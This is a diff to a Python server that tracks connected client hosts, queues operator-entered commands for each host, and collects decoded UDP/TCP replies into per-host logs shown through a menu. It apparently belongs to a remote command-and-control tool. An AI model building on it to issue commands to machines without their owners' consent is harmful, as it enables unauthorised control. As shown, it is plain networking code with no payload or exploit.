@@ -9,7 +9,9 @@ import time
 EOF = False
 LOCK = threading.Lock()
 LISTLOCK = threading.Lock()
+LOGLOCK = threading.Lock()
 HOSTDICT = dict()
+HOSTLOG = dict()
 PORT = 1234
 HOST = "127.0.0.1"
 
@@ -77,10 +79,16 @@ def decode(BinaryList:list):
 def recv_client_list(clientAddr): #Multi-threaded
     global LISTLOCK
     global HOSTDICT
+    global HOSTLOG
+    global LOGLOCK
     if clientAddr not in HOSTDICT.keys(): #Checks if a client is a known host
         LISTLOCK.acquire()
         HOSTDICT[clientAddr] = list() #adds if not
         LISTLOCK.release()
+        LOGLOCK.acquire()
+        HOSTLOG[clientAddr] = ""
+        LOGLOCK.release()
+
 
 
 #Fetch queued commands and return
@@ -105,9 +113,9 @@ def build_socket(sockType, host:str, port:int) -> socket:
 
 #Main incoming traffic handler
 def receive_traffic(serverSocketUDP:socket,serverSocketTCP:socket):
+    global HOSTLOG
     BinaryList = [] #holds all incoming binary TODO make into dict with [ip(str),log(str)]
     senderIp = [] #holds the ip of message sender TODO check if obsolete?
-    EOF = False
 
     #This is receiving data
     udp_Thread = threading.Thread(target=handle_UDP,args=(serverSocketUDP,BinaryList)) #Handles ones
@@ -121,7 +129,7 @@ def receive_traffic(serverSocketUDP:socket,serverSocketTCP:socket):
 
     output = decode(BinaryList) #TODO make multi host friendly
     if output != "":
-        print(senderIp[0]+": "+output)
+        HOSTLOG[senderIp[0]] += output
 
 
 def receiver_thread():
@@ -134,6 +142,7 @@ def receiver_thread():
 
 
 def display_options():
+    global HOSTLOG
     ipList = []
     selectedHost = "INVALID"
     with LISTLOCK:
@@ -154,9 +163,14 @@ def display_options():
             for clientIp in HOSTDICT.keys():
                 if clientIp[0] == ip[userChoice]:
                     selectedHost = clientIp
-    command = input("Input command: ").strip()
-    with LISTLOCK:
-        HOSTDICT[selectedHost].append(command)
+    userChoice = input("1: view logs\n2: input command\n>:")
+    if userChoice == "1":
+        print(HOSTLOG[selectedHost])
+        HOSTLOG[selectedHost] = ""
+    elif userChoice == "2":
+        command = input("Input command: ").strip()
+        with LISTLOCK:
+            HOSTDICT[selectedHost].append(command)
 
 
 def main():
